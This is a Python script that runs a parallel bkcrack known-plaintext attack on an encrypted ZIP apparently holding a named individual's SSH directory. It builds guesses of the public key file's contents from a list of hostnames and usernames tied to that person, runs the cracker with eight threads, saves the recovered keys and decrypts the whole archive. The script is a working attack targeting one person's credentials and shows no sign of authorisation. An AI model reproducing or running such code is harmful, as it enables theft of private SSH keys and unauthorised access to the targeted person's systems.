"""Parallel bkcrack attack with multi-threading, smart candidate ordering."""
import zlib
import os
import subprocess
import glob
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed

key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBopeRkclOrscs+rQVfK8bXmZ3ucAiJS2s2VVXWETWV0'

# Most likely candidates first - based on what we know about Dan:
# 1. github.com/nolandda (matches GitHub repo path)
# 2. nolan-dd local hostname patterns
# 3. Star Lab workstation names
# 4. Standard ubuntu/debian workstation names
candidates = [
    'github.com/nolandda', 'nolandda@github', 'nolandda@workstation', 'nolandda@ws-dc-01',
    'nolandda@ws-dc-02', 'nolandda@dc-ws-01', 'nolandda@t480s', 'nolandda@nolan-pc01',
    'nolandda@ws.local', 'nolandda@dc-1.lan', 'nolandda@dc-2.lan', 'nolandda@dc-3.lan',
    'nolandda@dc-4.lan', 'nolandda@dc-5.lan', 'nolandda@dc-6.lan', 'nolandda@dc-7.lan',
    'nolandda@dc-8.lan', 'nolandda@dc-9.lan', 'nolandda@dc-a.lan', 'nolandda@dc-b.lan',
    'nolandda@dc-c.lan', 'nolandda@dc-d.lan', 'nolandda@dc-e.lan', 'nolandda@dc-f.lan',
    'nolandda@work-01', 'nolandda@work-02', 'nolandda@star-pc', 'nolandda@star-01',
    'nolandda@star-02', 'nolandda@pc-nlan', 'nolandda@home.lan', 'nolandda@work.lan',
    'nolandda@dc-3.lan', 'nolandda@dc-4.lan', 'nolandda@dc-5.lan', 'nolandda@dc-6.lan',
    'nolandda@dc-7.lan', 'nolandda@dc-8.lan', 'nolandda@dc-9.lan', 'nolandda@dc-a.lan',
]

# Filter to 15-char only
candidates = [c for c in candidates if len(c) == 15]

out_dir = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\bkcrack_work'
bk = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\bkcrack-src\bkcrack-1.8.1\build\src\bkcrack.exe'
zip_path = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\nolandda_ssh-dir.zip'

# Generate compressed candidates at default level only (level 6 most common)
attacks = []
for c in candidates:
    full = key + ' ' + c + '\n'
    if len(full) != 97:
        continue
    for level in [6]:  # just default
        comp = zlib.compressobj(level, zlib.DEFLATED, -15)
        comp_raw = comp.compress(full.encode()) + comp.flush()
        outpath = os.path.join(out_dir, f'attack_{c.replace("@", "_AT_")}_lv{level}.bin')
        with open(outpath, 'wb') as f:
            f.write(comp_raw)
        attacks.append((c, level, outpath))

print(f'Running {len(attacks)} attacks in parallel (8 threads)...')

def run_attack(args):
    c, level, path = args
    try:
        result = subprocess.run(
            [bk, '-C', zip_path, '-c', 'ssh-dir/id_ed25519_github.pub', '-p', path, '-j', '1'],
            capture_output=True, text=True, timeout=180
        )
        out = result.stdout + result.stderr
        for line in out.splitlines():
            if line.startswith('Keys:'):
                return (c, level, line.strip())
        return None
    except subprocess.TimeoutExpired:
        return ('TIMEOUT', level, None)

results = []
with ThreadPoolExecutor(max_workers=8) as executor:
    futures = {executor.submit(run_attack, a): a for a in attacks}
    for f in as_completed(futures):
        a = futures[f]
        try:
            r = f.result()
            if r and isinstance(r, tuple) and len(r) == 3 and r[2] and 'Keys:' in r[2]:
                c, level, line = r
                print(f'*** FOUND: c={c!r} level={level}  {line}')
                results.append(r)
                executor.shutdown(wait=False, cancel_futures=True)
                break
        except Exception as e:
            pass

if results:
    c, level, line = results[0]
    keys = line.split(':', 1)[1].strip()
    with open(os.path.join(out_dir, 'keys.txt'), 'w') as f:
        f.write(keys)
    print(f'Saved keys: {keys}')
    # Decrypt all files
    out_zip = os.path.join(out_dir, 'nolandda_decrypted.zip')
    subprocess.run([bk, '-C', zip_path, '-k'] + keys.split() + ['-D', out_zip], check=True)
    print(f'Decrypted archive: {out_zip}')
else:
    print('No match found in candidates.')